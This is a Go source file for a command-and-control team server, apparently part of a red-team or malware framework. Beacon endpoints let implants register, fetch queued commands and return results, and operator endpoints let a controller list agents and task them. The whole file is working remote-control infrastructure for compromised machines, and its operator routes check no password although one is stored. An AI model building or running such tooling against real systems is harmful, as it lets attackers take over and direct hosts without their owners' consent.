package main

import (
	"net/http"

	"github.com/gin-gonic/gin"
)

type Route struct {
	Method  string
	Path    string
	Handler gin.HandlerFunc
}

type RouteConfig struct {
	OperatorRoutes []Route
	BeaconRoutes   []Route
}

type TeamServer struct {
	IP             string
	Port           string
	Password       string
	AgentList      []Agent
	AgentTasks     []Task
	AgentResults   []Result
	AgentCallbacks []Callback
}

func NewTeamServer(ip string, port string, password string) *TeamServer {
	return &TeamServer{
		IP:       ip,
		Port:     port,
		Password: password,
	}
}

func setupRoutes(r *gin.Engine, config RouteConfig) {
	for _, route := range config.OperatorRoutes {
		switch route.Method {
		case "GET":
			r.GET(route.Path, route.Handler)

		case "POST":
			r.POST(route.Path, route.Handler)
		}
	}

	for _, route := range config.BeaconRoutes {
		switch route.Method {
		case "GET":
			r.GET(route.Path, route.Handler)

		case "POST":
			r.POST(route.Path, route.Handler)
		}
	}
}

func (ts *TeamServer) GetAgents(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"agents": ts.AgentList})
}

func (ts *TeamServer) GetResults(c *gin.Context) {
	uid := c.Param("uid")
	results := []Result{}

	for _, result := range ts.AgentResults {
		if result.CommandID == uid {
			results = append(results, result)
		}
	}

	if len(results) > 0 {
		c.JSON(http.StatusOK, gin.H{"results": results})
		return
	}

	c.JSON(http.StatusNotFound, gin.H{"message": "No results found"})
}

func (ts *TeamServer) PostTasks(c *gin.Context) {
	uid := c.Param("uid")
	var command CommandData

	if err := c.BindJSON(&command); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"message": "Invalid JSON", "error": err.Error()})
		return
	}

	for _, agent := range ts.AgentList {
		if agent.UID == uid {
			commandID := randomString(10)
			tempTask := Task{UID: uid, CommandID: commandID, Command: command.Command}
			ts.AgentTasks = append(ts.AgentTasks, tempTask)
			c.JSON(http.StatusOK, gin.H{"message": "Task sent successfully", "uid": commandID})
			return
		}
	}

	c.JSON(http.StatusNotFound, gin.H{"message": "Agent not found"})
}

func (ts *TeamServer) Register(c *gin.Context) {
	var agent Agent
	if err := c.BindJSON(&agent); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"message": "Invalid JSON", "error": err.Error()})
		return
	}

	agent.UID = randomString(10)
	ts.AgentList = append(ts.AgentList, agent)
	c.JSON(http.StatusOK, gin.H{"message": "Agent registered successfully", "uid": agent.UID, "sleep": agent.Sleep})
}

func (ts *TeamServer) PostResults(c *gin.Context) {
	uid := c.Param("uid")
	var result Result
	if err := c.BindJSON(&result); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"message": "Invalid JSON", "error": err.Error()})
		return
	}

	if uid != result.CommandID {
		c.JSON(http.StatusBadRequest, gin.H{"message": "Invalid command ID"})
		return
	}

	for i, task := range ts.AgentTasks {
		if task.CommandID == result.CommandID {
			ts.AgentResults = append(ts.AgentResults, result)
			ts.AgentTasks = append(ts.AgentTasks[:i], ts.AgentTasks[i+1:]...)
			c.JSON(http.StatusOK, gin.H{"message": "Result received successfully"})
			return
		}
	}

	c.JSON(http.StatusNotFound, gin.H{"message": "Result not found for the given command ID"})
}

func (ts *TeamServer) GetTasks(c *gin.Context) {
	uid := c.Param("uid")
	tasks := []Task{}

	for i, callback := range ts.AgentCallbacks {
		if callback.AgentUID == uid {
			ts.AgentCallbacks = append(ts.AgentCallbacks[:i], ts.AgentCallbacks[i+1:]...)
		}
	}

	ts.AgentCallbacks = append(ts.AgentCallbacks, Callback{AgentUID: uid, LastCallback: 0})

	for _, task := range ts.AgentTasks {
		if task.UID == uid {
			tasks = append(tasks, task)
		}
	}

	if len(tasks) > 0 {
		c.JSON(http.StatusOK, gin.H{"tasks": tasks})
		return
	}

	c.JSON(http.StatusNotFound, gin.H{"message": "No tasks found"})
}

func Start(ts *TeamServer, port string) {
	gin.SetMode(gin.ReleaseMode)
	r := gin.Default()

	config := RouteConfig{
		OperatorRoutes: []Route{
			{Method: "GET", Path: "/agents", Handler: ts.GetAgents},
			{Method: "GET", Path: "/results/:uid", Handler: ts.GetResults},
			{Method: "POST", Path: "/tasks/:uid", Handler: ts.PostTasks},
		},
		BeaconRoutes: []Route{
			{Method: "POST", Path: "/register", Handler: ts.Register},
			{Method: "POST", Path: "/results/:uid", Handler: ts.PostResults},
			{Method: "GET", Path: "/tasks/:uid", Handler: ts.GetTasks},
		},
	}

	setupRoutes(r, config)

	go func() {
		r.Run(ts.IP + ":" + port)
	}()
}
